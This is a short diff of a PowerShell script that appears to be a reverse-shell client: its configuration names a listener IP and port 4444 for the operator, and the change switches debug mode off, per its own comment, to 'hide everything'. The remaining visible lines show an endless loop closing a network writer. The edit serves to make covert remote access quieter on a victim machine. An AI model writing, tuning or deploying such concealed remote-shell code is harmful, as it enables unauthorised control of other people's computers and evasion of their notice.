@@ -1,5 +1,5 @@
 # --- CONFIGURATION ---
-$DebugMode = $true     # SET TO $false TO HIDE EVERYTHING
+$DebugMode = $false     # SET TO $false TO HIDE EVERYTHING
 $LHOST = "192.168.1.129" # Your listener IP
 $LPORT = 4444          # Your listener Port
 $WorkDir = "C:\Win"
@@ -128,3 +128,4 @@ while ($true) {
         if ($null -ne $writer) { $writer.Close() }
     }
 }
+
